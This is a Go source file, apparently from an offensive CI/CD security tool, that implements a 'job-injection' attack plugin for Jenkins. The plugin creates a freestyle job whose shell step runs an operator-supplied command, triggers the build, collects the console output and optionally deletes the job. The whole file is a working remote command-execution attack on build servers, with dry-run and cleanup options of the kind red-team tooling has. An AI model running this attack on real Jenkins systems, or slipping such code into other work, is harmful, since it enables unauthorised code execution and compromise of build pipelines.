package jobinjection

import (
	"context"
	"fmt"
	"html"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/detections"
	"github.com/praetorian-inc/trajan/pkg/jenkins"
)

const jobXMLTemplate = `<?xml version='1.0' encoding='UTF-8'?>
<project>
  <builders>
    <hudson.tasks.Shell>
      <command>%s</command>
    </hudson.tasks.Shell>
  </builders>
</project>`

func init() {
	registry.RegisterAttackPlugin("jenkins", "job-injection", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements job injection attack by creating a malicious freestyle job.
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new job-injection attack plugin.
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"job-injection",
			"Create malicious Jenkins job with shell command payload",
			"jenkins",
			attacks.CategoryCICD,
		),
	}
}

// CanAttack checks if job injection is applicable.
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	// Job injection requires job creation permissions, generally applicable
	return true
}

// Execute performs the job injection attack.
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	jPlatform, ok := opts.Platform.(*jenkins.Platform)
	if !ok {
		return nil, fmt.Errorf("platform is not Jenkins")
	}
	client := jPlatform.Client()

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
	}

	// Determine command to execute
	command := opts.Payload
	if command == "" {
		if cmd, ok := opts.ExtraOpts["command"]; ok && cmd != "" {
			command = cmd
		}
	}
	if command == "" {
		return nil, fmt.Errorf("must provide --payload or --command for job-injection")
	}

	jobName := fmt.Sprintf("trajan-attack-%s", opts.SessionID)
	configXML := fmt.Sprintf(jobXMLTemplate, html.EscapeString(command))

	if opts.DryRun {
		result.Success = true
		result.Message = fmt.Sprintf("DRY RUN: Would create job '%s' with shell command", jobName)
		result.Data = map[string]interface{}{
			"job_name":   jobName,
			"command":    command,
			"config_xml": configXML,
			"note":       "Use --confirm to execute",
		}
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  jobName,
				Description: "Malicious freestyle job",
			},
		}
		result.CleanupActions = []attacks.CleanupAction{
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  jobName,
				Action:      "delete",
				Description: "Delete injected job",
			},
		}
		return result, nil
	}

	// Create the job
	if err := client.CreateJob(ctx, jobName, configXML); err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("Failed to create job: %v", err)
		return result, nil
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  jobName,
		Description: "Injected freestyle job",
	})

	result.CleanupActions = append(result.CleanupActions, attacks.CleanupAction{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  jobName,
		Action:      "delete",
		Description: "Delete injected job",
	})

	// Trigger build
	if err := client.TriggerBuild(ctx, jobName); err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("Job created but build trigger failed: %v", err)
		result.Data = map[string]interface{}{
			"job_name": jobName,
		}
		return result, nil
	}

	// Poll for build completion
	var buildInfo *jenkins.BuildInfo
	timeout := 60 * time.Second
	pollInterval := 2 * time.Second
	start := time.Now()

	for time.Since(start) < timeout {
		time.Sleep(pollInterval)
		info, err := client.GetLastBuild(ctx, jobName)
		if err != nil {
			continue // Build may not have started yet
		}
		if info.Result != "" {
			buildInfo = info
			break
		}
	}

	if buildInfo == nil {
		result.Success = true
		result.Message = fmt.Sprintf("Job '%s' created and triggered, but build did not complete within timeout. Check manually.", jobName)
		result.Data = map[string]interface{}{
			"job_name": jobName,
			"status":   "INDETERMINATE",
		}
		return result, nil
	}

	// Retrieve console output
	consoleOutput, err := client.GetBuildConsole(ctx, jobName, buildInfo.Number)
	if err != nil {
		consoleOutput = fmt.Sprintf("(failed to retrieve console: %v)", err)
	}

	// Cleanup if requested
	if cleanup, ok := opts.ExtraOpts["cleanup"]; ok && cleanup == "true" {
		if delErr := client.DeleteJob(ctx, jobName); delErr != nil {
			fmt.Printf("Warning: failed to delete job %s: %v\n", jobName, delErr)
		} else {
			// Remove cleanup actions since we already cleaned up
			result.CleanupActions = nil
		}
	}

	result.Success = buildInfo.Result == "SUCCESS"
	result.Message = fmt.Sprintf("Job '%s' build #%d completed with result: %s", jobName, buildInfo.Number, buildInfo.Result)
	result.Data = map[string]interface{}{
		"job_name":     jobName,
		"build_number": buildInfo.Number,
		"build_result": buildInfo.Result,
		"output":       consoleOutput,
	}
	return result, nil
}

// Cleanup deletes jobs created by this plugin.
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	jPlatform, ok := session.Platform.(*jenkins.Platform)
	if !ok {
		return fmt.Errorf("platform is not Jenkins")
	}
	client := jPlatform.Client()

	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}
		for _, action := range result.CleanupActions {
			if action.Action == "delete" {
				if err := client.DeleteJob(ctx, action.Identifier); err != nil {
					return fmt.Errorf("deleting job %s: %w", action.Identifier, err)
				}
			}
		}
	}
	return nil
}
